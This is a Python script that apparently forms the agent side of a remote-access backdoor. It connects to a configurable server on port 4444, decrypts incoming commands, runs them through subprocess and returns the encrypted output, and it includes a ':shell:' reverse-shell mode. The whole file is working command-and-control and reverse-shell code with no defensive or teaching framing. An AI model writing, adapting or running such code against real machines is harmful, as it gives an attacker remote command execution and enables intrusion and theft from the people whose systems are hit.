
import socket
import subprocess
from modules.crypto import cipher

HOST = '127.0.0.1'  # Pas aan naar server-IP
PORT = 4444

def decrypt_command(data):
    return cipher.decrypt(data).decode('utf-8')

def encrypt_response(msg):
    return cipher.encrypt(msg.encode('utf-8'))

def connect():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                command = decrypt_command(data)
                if command.startswith(":shell:"):
                    reverse_shell(s)
                elif command.startswith(":exit:"):
                    break
                else:
                    output = subprocess.getoutput(command)
                    s.send(encrypt_response(output))
            except:
                break

def reverse_shell(s):
    while True:
        s.send(b"[shell ready]\n")
        try:
            cmd = s.recv(1024).decode('utf-8')
            if cmd.strip().lower() == 'exit':
                break
            result = subprocess.getoutput(cmd)
            s.send(result.encode('utf-8'))
        except:
            break

if __name__ == '__main__':
    connect()
